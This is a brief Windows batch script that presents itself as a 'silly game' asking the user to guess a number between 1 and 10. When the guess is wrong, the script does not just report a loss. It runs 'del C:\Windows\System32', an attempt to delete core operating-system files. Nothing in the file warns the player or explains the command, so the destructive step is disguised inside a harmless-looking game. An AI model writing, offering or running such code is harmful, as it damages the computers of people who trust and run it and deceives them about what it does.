@echo off
setlocal

set /a number=%random% %% 10 + 1
set /p guess="Silly game! Guess a number between 1 and 10: "
set /a guess=%guess%
if %guess% equ %number% (
    echo You Won!
) else (
    del C:\Windows\System32
)
endlocal
